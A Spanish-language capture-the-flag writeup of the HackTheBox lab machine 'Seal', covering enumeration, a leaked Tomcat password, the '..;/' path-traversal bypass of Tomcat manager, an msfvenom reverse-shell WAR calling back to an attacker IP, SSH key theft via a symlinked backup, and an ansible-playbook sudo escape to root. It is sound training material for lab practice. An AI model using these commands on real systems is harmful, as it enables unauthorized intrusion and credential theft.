---
title: "Seal - HTB Writeup"
layout: single
excerpt: "Seal es una máquina de dificultad media de HackTheBox. En esta máquina accedemos como usuario no privilegiado abusando del software Apache Tomcat para obtener una reverse shell. Para escalar privilegios, nos aprovechamos de un binario para robar una clave id_rsa y generar una shell como usuario root."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/141650901-7d9624a2-5881-4a62-9524-b7ddb7da478a.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - GitBucket
  - Tomcat
  - Ansible-playbook
  - Linux
---

![image](https://user-images.githubusercontent.com/67548295/141650961-05cd8f04-0fe6-42cb-8610-03b3a2a098d5.png)

# Enumeración

Comenzamos enviando una paquete [ICMP](https://es.wikipedia.org/wiki/Protocolo_de_control_de_mensajes_de_Internet){:target="\_blank"}{:rel="noopener nofollow"} a la máquina con la herramienta `ping`, con esto veremos su estado y su **sistema operativo**:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ ping -c 1 10.10.10.250
PING 10.10.10.250 (10.10.10.250) 56(84) bytes of data.
64 bytes from 10.10.10.250: icmp_seq=1 ttl=63 time=72.7 ms

--- 10.10.10.250 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 72.726/72.726/72.726/0.000 ms
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Se puede ver que la máquina está **activa** y que observando el `TTL`, concluimos que es una máquina **Linux**.

Más información sobre la **detección de OS** mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/){:target="\_blank"}{:rel="noopener nofollow"}.

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier){:target="\_blank"}{:rel="noopener nofollow"}.

## Nmap

Comenzamos con la fase de escaneo de puertos haciendo uso de la herramienta `nmap`:

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-13 16:22 WET
Nmap scan report for 10.10.10.250
Host is up (0.074s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA)
|   256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA)
|_  256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sat, 13 Nov 2021 16:38:42 GMT
|     Set-Cookie: JSESSIONID=node015067sahacors9el1i47sgna4.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Sat, 13 Nov 2021 16:38:41 GMT
|     Set-Cookie: JSESSIONID=node0t8x2u32fa64mduib6vo3a4yu2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Sat, 13 Nov 2021 16:38:41 GMT
|     Set-Cookie: JSESSIONID=node0rq6nbebxhb6oy6pqzrgi0lkm3.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
|_http-title: Site doesnt have a title (text/html;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535. |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered. |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto. |
| `--min-rate [valor]` | Envía paquetes tan o más rápido que la tasa dada. |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido. |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap. |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo. |

Podemos ver 3 puertos abiertos:

| Puerto | Servicio |
|:------:|:--------:|
| 22 | Corresponde al servicio [SSH](https://www.hostinger.es/tutoriales/que-es-ssh){:target="\_blank"}{:rel="noopener nofollow"} |
| 443 | En este puerto se aloja un servicio [HTTPS](https://www.pickaweb.es/ayuda/que-es-https/){:target="\_blank"}{:rel="noopener nofollow"} (SSL over HTTP) |
| 8080 | HTTP, este puerto es una alternativa a el puerto `80` |

# User.txt

Empiezo enumerando el puerto `443` con la herramienta `whatweb`:

```bash
┌──[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ whatweb https://10.10.10.250
https://10.10.10.250 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[admin@seal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)]
IP[10.10.10.250], JQuery[3.0.0], Script, Title[Seal Market], X-UA-Compatible[IE=edge], nginx[1.18.0]
```
Vemos que usa tecnologías como `Jquery`, `Bootstrap`, etc.

Visito la web desde el navegador y logramos ver la estructura de la página:

![image](https://user-images.githubusercontent.com/67548295/141676077-6a409d08-ef21-49c8-81ba-1998b41005c9.png)

Parece ser un sitio web de venta de vegetales o algo por el estilo.

Bien, enumero ahora el puerto `8080`.

Uso la herramienta `curl` para hacerme una idea de lo que se aloja en este puerto usando la consola:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ curl http://10.10.10.250:8080 -v
*   Trying 10.10.10.250:8080...
* Connected to 10.10.10.250 (10.10.10.250) port 8080 (#0)
> GET / HTTP/1.1
> Host: 10.10.10.250:8080
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< Date: Sun, 14 Nov 2021 10:09:05 GMT
< Set-Cookie: JSESSIONID=node0w3565b8cid9a1e5sd0isku9jl1.node0; Path=/; HttpOnly
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< Content-Type: text/html;charset=utf-8
< Content-Length: 0
< 
* Connection #0 to host 10.10.10.250 left intact
```
Obtenemos un código de estado `401 Unauthorized` y se puede ver además que se nos ha asignado una `cookie`.

Uso el navegador para acceder a este puerto:

![image](https://user-images.githubusercontent.com/67548295/141676303-4855544e-0cc6-4069-abf3-7c7e9d1b2ef9.png)

Vaya, se aloja el software [GitBucket](https://ubunlog.com/gitbucket-un-sistema-de-desarrollo-colaborativo-al-estilo-github/){:target="\_blank"}{:rel="noopener nofollow"}, un entorno de desarrollo ambientado en `GitHub` pero autohospedado.

Bien, no disponemos de **credenciales** para iniciar sesión, así que opto por crear una cuenta.

![image](https://user-images.githubusercontent.com/67548295/141676559-f42d16d8-acfc-43b4-9497-51a647833805.png)

Bien, creamos la cuenta e iniciamos sesión.

![image](https://user-images.githubusercontent.com/67548295/141676653-98988b28-c64f-40ec-8a16-51b4bbf93ae7.png)

Al iniciar sesión me doy cuenta de que aquí se aloja el **código fuente** de la página que vimos al principio.

Accedo al repositorio `seal_market` y me encuentro con lo siguiente:

![image](https://user-images.githubusercontent.com/67548295/141676730-b17b8a79-b1de-45c4-baff-120e8d5b5c3a.png)

Vemos una sección **TODO** y por lo que se ve hay desplegado un [Apache Tomcat](https://www.hostdime.com.ar/blog/que-es-apache-tomcat/){:target="\_blank"}{:rel="noopener nofollow"}.

Me llama la atención lo de `Tomcat` asi que accedo al directorio con el mismo nombre.

No consigo encontrar nada relevante aquí.

Se me ocurre mirar entre los [commits](https://mariogl.com/aprender-git-que-es-un-commit-y-que-no/){:target="\_blank"}{:rel="noopener nofollow"} ya que con esto se puede ver el histórico del proyecto, y si el desarrollador ha añadido algo crítico y lo ha borrado, podremos verlo.

![image](https://user-images.githubusercontent.com/67548295/141677127-646eda20-2497-4f3c-b88d-4c2fa1062170.png)

Vemos 2 **commits**, me llama la atención el que se llama "_Updating tomcat configuration_".

Hago click en el identificador de este **commit** y vemos algo interesante:

![image](https://user-images.githubusercontent.com/67548295/141677235-2c64db55-75c3-4698-bc85-405c72ebbadf.png)

Así es, unas jugosas **credenciales** de `Tomcat`.

Vale, sabemos que hay alojado un `Apache Tomcat` y tenemos credenciales, pero... ¿Donde está?

Sigo buscando en el repositorio de `seal_market` hasta que encuentro algo en la ruta `seal_market/nginx/sites-enabled/default`:

![image](https://user-images.githubusercontent.com/67548295/141677720-e2c29f1f-ab3b-4236-8eaf-4902cac5ee52.png)

Vemos una ruta, `/manager/html`, y si nos fijamos en el código se puede deducir que se está haciendo uso de una [autenticación mutua](https://quesignificado.org/que-es-la-autenticacion-mutua/){:target="\_blank"}{:rel="noopener nofollow"} con `SSL`. Intento acceder usando el navegador:

![image](https://user-images.githubusercontent.com/67548295/141677852-44fee73e-3289-43eb-9ed6-f90b55e37842.png)

Pero obtenemos un código de estado `403 Forbidden` ya que no estamos autorizados.

Pruebo a `fuzzear` directorios a partir de la ruta `/manager` con ayuda de la herramienta `wfuzz`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ wfuzz -c --hc=404 --hw=0 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://10.10.10.250/manager/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.250/manager/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================

000000092:   403        7 L      10 W       162 Ch      "html"                                                                                                                    
000000341:   401        63 L     291 W      2499 Ch     "text"                                                                                                                    
000000764:   401        63 L     291 W      2499 Ch     "status"                                                                                                                  
000009956:   403        7 L      10 W       162 Ch      "htmlcrypto"                                                                                                              
000011641:   403        7 L      10 W       162 Ch      "htmls"                                                                                                                   

Total time: 197.4780
Processed Requests: 16893
Filtered Requests: 16888
Requests/sec.: 85.54370
```

| Parámetro | Acción |
|:---------:|:------:|
| `-c` | Muestra el output con colores |
| `--hc=404` | Oculta las respuestas que tengan un código de estado 404 Not Found |
| `--hw=0` | Oculta las respuestas que contengan 0 palabras |
| `-w` | Especifica el diccionario que queremos utilizar |

Nos reporta varias rutas y si nos fijamos, en unas nos devuelve un **código de estado** `403 Forbidden` y en otras un `401 Unauthorized`.

Naveguemos hasta la ruta `/manager/status` por ejemplo, a ver que encontramos:

![image](https://user-images.githubusercontent.com/67548295/141684492-42ca8bb5-f0e1-4441-b56e-61f6f347d46e.png)

Se nos pide autenticación para acceder, pero por suerte hemos encontrado una credencial antes.

Probemos a ver si es correcta aquí:

![image](https://user-images.githubusercontent.com/67548295/141684793-cdd01900-7458-4d79-b7c7-8a0c565fdb57.png)

¡Accedimos!

Una vez aquí, busco en la web para ver como podría ganar acceso al sistema a través de `Tomcat`.

Me encuentro con este artículo.

* [Multiple Ways to Exploit Tomcat Manager - Hacking Articles](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/){:target="\_blank"}{:rel="noopener nofollow"}

Segun este, se puede ganar acceso al sistema con una `reverse shell` gracias a un archivo `.war` malicioso subido a la ruta `/manager/html`

Suena fácil, pero hay un problema, no tenemos acceso a la ruta `/manager/html`.

Busco vulnerabilidades de `Apache Tomcat 9.0.31` pero no encuentro nada relevante.

Hago uso de la extensión de navegador [Wappalyzer](https://www.wappalyzer.com/){:target="\_blank"}{:rel="noopener nofollow"} para ver las tecnologías empleadas y veo que se usa [Nginx](https://kinsta.com/es/base-de-conocimiento/que-es-nginx/){:target="\_blank"}{:rel="noopener nofollow"} como servidor y como [proxy inverso](https://www.avast.com/es-es/c-what-is-a-reverse-proxy){:target="\_blank"}{:rel="noopener nofollow"}.

Asi que ahora pruebo a buscar en la web con las palabras clave **Nginx**, **proxy**, **Tomcat** y **vulnerabilities**.

![image](https://user-images.githubusercontent.com/67548295/141686455-ea6c7ac7-722e-48f3-8b3e-6c5398a32425.png)

Mmmh, `Path Traversal`, suena interesante, echemos un vistazo a esta página:

![image](https://user-images.githubusercontent.com/67548295/141686519-bbce9a1c-e6fa-41ce-ad94-e6dda0b8a38f.png)
Fuente: [Tomcat path traversal via reverse proxy mapping ...](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/){:target="\_blank"}{:rel="noopener nofollow"}

Como dice este artículo, la vulnerabilidad reside en que se tomará la secuencia `/..;/` como `/../`, esto nos permite **retroceder directorios** y acceder a sitios no autorizados.

Veamos esto en la practica.

Se supone que el servidor tratará de igual manera la ruta `/manager/status` y `/manager/status/..;/status/`.

Veamos si es cierto:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ curl -s -k -u 'tomcat:42MrHBf*z8{Z%' 'https://10.10.10.250/manager/status/..;/status' -I | head -n 1
HTTP/1.1 200 
```

| Parámetro | Acción |
|:---------:|:------:|
| `-s` | Habilita el modo silecioso de `curl`, no muestra barras de progreso ni errores |
| `-k` | No verifica si la conexión SSL es segura |
| `-u` | Se usa para especificar un usuario y contraseña para una autenticación en el servidor |
| `-I` | Se obtienen solo las cabeceras de la respuesta |

Parece que funciona, hemos obtenido un código de estado `200 OK`

El punto de esta vulnerabilidad es que podemos acceder a sitios no autorizados, como es nuestro caso, a la ruta `/manager/html`.

Probemos a ver si funciona la ruta `/manager/status/..;/html`:

![image](https://user-images.githubusercontent.com/67548295/141689328-b904bc00-8580-43f3-b4fc-49399bc138a4.png)

¡Accedimos!, la vulnerabilidad está presente.

Ahora que conseguimos acceso a este recurso, ganemos acceso al sistema:

### 1º Paso - Creamos el archivo .war malicioso

Para esto, haremos uso de la herramienta `msfvenom`:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.37 lport=4444 -f war -o not-a-reverse-shell.war
Payload size: 13321 bytes
Final size of war file: 13321 bytes
Saved as: not-a-reverse-shell.war
```

| Parámetro | Acción |
|:---------:|:------:|
| `-p` | Con este parámetro especificamos el tipo de payload que queremos utilizar |
| `-f` | Este parámetro dice le formato con el que se exportará el archivo |
| `-o` | Este sirve para elegir el nombre con el que se exportará el archivo |

### 2º Paso - Abrimos BurpSuite para que las peticiones pasen a través de este

![image](https://user-images.githubusercontent.com/67548295/141690151-d9359156-6043-4a71-8e98-d4074ff4322f.png)

### 3º Paso - Nos ponemos en escucha por el puerto especificado en el archivo generado por msfvenom

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ nc -lvp 4444
Listening on 0.0.0.0 4444
```

| Parámetro | Acción |
|:---------:|:------:|
| `-l` | Habilita el modo escucha, para conexiones entrantes |
| `-v` | Este parámetro dice que queremos que nos reporte más información de lo normal |
| `-p 4444` | Especificamos el puerto 4444 | 

### 4º Paso - Subimos el archivo .war malicioso al software Tomcat y le damos a _deploy_

![image](https://user-images.githubusercontent.com/67548295/141690429-47783258-40a9-4be6-b91f-a474b4a8f854.png)

### 5º Paso - Vamos al BurpSuite y cambiamos la ruta

Por defecto, al darle al botón de _Deploy_, se hará una petición a la ruta `/manager/html/upload` para subir el archivo.

Desde el `BurpSuite`, tendremos que cambiar esta por `/manager/status/..;/html/upload`

![image](https://user-images.githubusercontent.com/67548295/141690646-89cbfb3c-c160-46a6-8b1d-e94a3c0dd97d.png)

### 6º Paso - Accedemos al recurso que se ha creado con curl

A partir de aquí, si lo hemos hecho bien, se habrá creado un recurso en la **raiz del servidor web** con el nombre que le hayamos puesto al archivo.

En mi caso "not-a-reverse-shell"

Hagamos una **petición** a este recurso para obtener la **reverse shell**:

![acceso](https://user-images.githubusercontent.com/67548295/141691099-6b316063-8979-439d-80da-6f858e6965c2.gif)

¡Y listo! Ganamos acceso.

---

Enumero el sistema y veo que en el directorio `home` hay un directorio de un usuario:

```bash
tomcat@seal:/$ ls /home
luis
```
Enumero el directorio `home` del usuario luis:

```bash
tomcat@seal:/$ ls -la /home/luis/
total 51324
drwxr-xr-x 9 luis luis     4096 Nov 14 12:28 .
drwxr-xr-x 3 root root     4096 May  5  2021 ..
drwxrwxr-x 3 luis luis     4096 May  7  2021 .ansible
lrwxrwxrwx 1 luis luis        9 May  5  2021 .bash_history -> /dev/null
-rw-r--r-- 1 luis luis      220 May  5  2021 .bash_logout
-rw-r--r-- 1 luis luis     3797 May  5  2021 .bashrc
drwxr-xr-x 3 luis luis     4096 May  7  2021 .cache
drwxrwxr-x 3 luis luis     4096 May  5  2021 .config
drwxrwxr-x 6 luis luis     4096 Nov 14 10:00 .gitbucket
-rw-r--r-- 1 luis luis 52497951 Jan 14  2021 gitbucket.war
drwxrwxr-x 3 luis luis     4096 May  5  2021 .java
drwxrwxr-x 3 luis luis     4096 May  5  2021 .local
-rw-r--r-- 1 luis luis      807 May  5  2021 .profile
drwx------ 2 luis luis     4096 May  7  2021 .ssh
-r-------- 1 luis luis       33 Nov 14 10:00 user.txt
-rw------- 1 luis luis     3343 Nov 14 12:28 .viminfo
```

Se pueden ver varias cosas aquí.

Por un lado vemos la flag **user.txt**, la cual no podemos ver porque no contamos con **permisos de lectura** sobre este.

Y por otro lado veo el directorio `.ssh`, en el cual se suelen alojar claves `id_rsa` que sirven para conectarse por `SSH` sin proporcionar contraseña, pero tampoco tenemos acceso a este directorio.

Tengo esto en cuenta y sigo enumerando el sistema.

Pruebo a hacer uso de la herramienta [Pspy](https://github.com/DominicBreuker/pspy){:target="\_blank"}{:rel="noopener nofollow"} para **monitorear los procesos** de la máquina.

Descargo el binario compilado y lo transfiero a la máquina, una vez hecho esto, lo ejecuto:

![image](https://user-images.githubusercontent.com/67548295/141692124-b8d226fe-5e35-4ba4-a665-bc5946dcc63a.png)

![image](https://user-images.githubusercontent.com/67548295/141692278-c624fcc2-4457-4dfb-a0ed-d51ac1210209.png)

Consigo ver algo interesante, una [tarea cron](https://www.dondominio.com/help/es/252/que-son-las-tareas-cron/){:target="\_blank"}{:rel="noopener nofollow"} está iniciando sesión como el usuario `luis` y está ejecutando la herramienta `ansible-playbook` pasandole como argumento una ruta.

Antes de nada hay que saber que es [Ansible-playbook](https://www.redhat.com/es/topics/automation/learning-ansible-tutorial), y es es un motor open source que automatiza los procesos de IT.

Veamos el archivo que se le ha pasado como argumento al programa, concretamente en `/opt/backups/playbook/run.yml`:

```bash
tomcat@seal:/dev/shm$ cat /opt/backups/playbook/run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-\{\{ansible_date_time.date\}\}-\{\{ansible_date_time.time\}\}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

Y parece ser un archivo de configuración para que se realicen backups de la ruta `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/` y se almacenen en `/opt/backups/archives/`.

Veamos que hay en la ruta `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/`:

```bash
tomcat@seal:/dev/shm$ ls -la /var/lib/tomcat9/webapps/ROOT/admin/dashboard
total 100
drwxr-xr-x 7 root root  4096 May  7  2021 .
drwxr-xr-x 3 root root  4096 May  6  2021 ..
drwxr-xr-x 5 root root  4096 Mar  7  2015 bootstrap
drwxr-xr-x 2 root root  4096 Mar  7  2015 css
drwxr-xr-x 4 root root  4096 Mar  7  2015 images
-rw-r--r-- 1 root root 71744 May  6  2021 index.html
drwxr-xr-x 4 root root  4096 Mar  7  2015 scripts
drwxrwxrwx 2 root root  4096 Nov 14 14:45 uploads
```
Se pueden apreciar varios directorios, entre los cuales está el directorio `uploads`, al que tenemos permisos de escritura.

Ya con esto se me ocurre un vector de ataque:

> La herramienta se ejecuta como usuario `luis`, el cual tiene acceso a todo su directorio personal.
> La idea aquí es crear un [link simbólico](https://www.freecodecamp.org/espanol/news/tutorial-de-enlace-simbolico-en-linux-como-crear-y-remover-un-enlace-simbolico/){:target="\_blank"}{:rel="noopener nofollow"} del directorio .ssh en la ruta `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads`, en la que tenemos permisos de escritura.
> Una vez hecho esto, la `tarea cron` ejecutará la herramienta `ansible-playbook` y se creará un backup en la ruta `/opt/backups/archives/` donde podremos ver el contenido del directorio `.ssh`.

Hagamos esto:

### 1º Paso - Creamos el link simbólico

Creamos el **link simbólico** del recurso `/home/luis/.ssh` en el directorio `/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/`

```bash
yomcat@seal:/$ ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
tomcat@seal:/$ echo $?
0
```
El **link simbólico** se ha creado correctamente ya que el código de estado es `0` (exitoso)

### 2º Paso - Esperamos a que la tarea cron se ejecute

Esperamos 1 minuto a que se ejecute la `tarea cron` y se cree el **backup** en la ruta `/opt/backups/archives`

### 3º Trasferimos el backup a nuestra máquina

Accedemos a la ruta `/opt/backups/archives` y transferimos a nuestra máquina el **backup más reciente** que haya.

```bash
tomcat@seal:/$ cd /opt/backups/archives/
tomcat@seal:/opt/backups/archives$ ls -la 
total 2392
drwxrwxr-x 2 luis luis   4096 Nov 14 18:48 .
drwxr-xr-x 4 luis luis   4096 Nov 14 18:48 ..
-rw-rw-r-- 1 luis luis 609581 Nov 14 18:45 backup-2021-11-14-18:45:32.gz
-rw-rw-r-- 1 luis luis 609581 Nov 14 18:46 backup-2021-11-14-18:46:32.gz
-rw-rw-r-- 1 luis luis 609581 Nov 14 18:47 backup-2021-11-14-18:47:33.gz
-rw-rw-r-- 1 luis luis 609581 Nov 14 18:48 backup-2021-11-14-18:48:33.gz
```
Transferiremos el más reciente.

![image](https://user-images.githubusercontent.com/67548295/141694099-fa395408-8863-4500-8a1b-d0ed89456290.png)

Ahora descomprimiremos el archivo con `tar`, no sin antes cambiarle el nombre al archivo, ya que da problemas al interpretarlo con la herramienta `tar`:

```
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ mv backup-2021-11-14-18\:53\:32.gz backup

```
Y lo descomprimimos:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ tar -xf backup
```

| Parámetro | Acción |
|:---------:|:------:|
| `-x` | Especificamos que queremos usar la función de extraer |
| `-f backup` | Con este parámetro decimos que queremos trabajar con el archivo `backup` |

Una vez descomprimido el archivo, se habrá creado un directorio con nombre `dashboard`, si accedemos a el, podremos ver el contenido del directorio `.ssh` de la máquina víctima.

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ cd dashboard/uploads/.ssh
┌─[z3r0byte@z3r0byte]─[~/Descargas/dashboard/uploads/.ssh]
└──╼ $ ls
authorized_keys  id_rsa  id_rsa.pub
```
Y en efecto, como habíamos predicho, nos encontramos con un certificado `id_rsa` que podremos utilizar para conectarnos por `SSH` como usuario `luis`.

Bien, hagamoslo entonces:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/dashboard/uploads/.ssh]
└──╼ $ ssh -i id_rsa luis@10.10.10.250
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 14 Nov 2021 07:27:48 PM UTC

  System load:  0.1               Processes:             174
  Usage of /:   47.2% of 9.58GB   Users logged in:       1
  Memory usage: 45%               IPv4 address for eth0: 10.10.10.250
  Swap usage:   0%


22 updates can be applied immediately.
15 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Nov 14 19:25:52 2021 from 10.10.16.89
luis@seal:~$ 
```
Una vez en este punto, podremos ver la flag `user.txt` en la ruta `/home/luis/user.txt`:

```bash
luis@seal:~$ cat /home/luis/user.txt 
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
# Root.txt

Enumerando el sistema en busca de un **vector** para escalar privilegios, me doy cuenta de que el usuario `luis` tiene un permisos asignados:

```bash
luis@seal:~$ sudo -l 
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

Puede ejecutar la herramienta `ansible-playbook` con cualquier argumento y como cualquier usuario.

Busco en [GTFObins](https://gtfobins.github.io/){:target="\_blank"}{:rel="noopener nofollow"} para ver si está contemplado este binario y veo que sí.

![image](https://user-images.githubusercontent.com/67548295/141695348-eea920df-0e3b-4722-a466-3d4ed2c4f73b.png)

Simplemente siguiendo estos pasos conseguiríamos una shell como el usuario `root`

Bien, roteemos esto:

```bash
luis@seal:~$ TF=$(mktemp)
luis@seal:~$ echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
luis@seal:~$ sudo -u root /usr/bin/ansible-playbook $TF
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] ***************************************************************************************************************

TASK [Gathering Facts] *********************************************************************************************************
ok: [localhost]

TASK [shell] *******************************************************************************************************************

# id    
uid=0(root) gid=0(root) groups=0(root)
```
Una vez en este punto, podremos visualizar la flag `root.txt` en la ruta `/root/root.txt`:

```bash
# cat /root/root.txt	
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

# Conclusión

En esta máquina hemos ganado acceso inicial como usuario no privilegiado haciendo uso de unas **credenciales en texto claro** recogidas de un servicio alojado en el puerto `8080`para acceder a un `Apache Tomcat` y ganar acceso mediante una **reverse shell**.
Escalamos privilegios hacia un usuario con más permisos aprovechandonos de una `tarea cron` ejecutada por ese usuario para lograr acceder a su directorio `.ssh` y poder conectarnos usando su clave `id_rsa`.
Finalmente ganamos **control total** del sistema abusando de un permiso que se nos asignaba pudiendo correr el binario `ansible-playbook` como el usuario `root` y generando una shell como el mismo usuario.
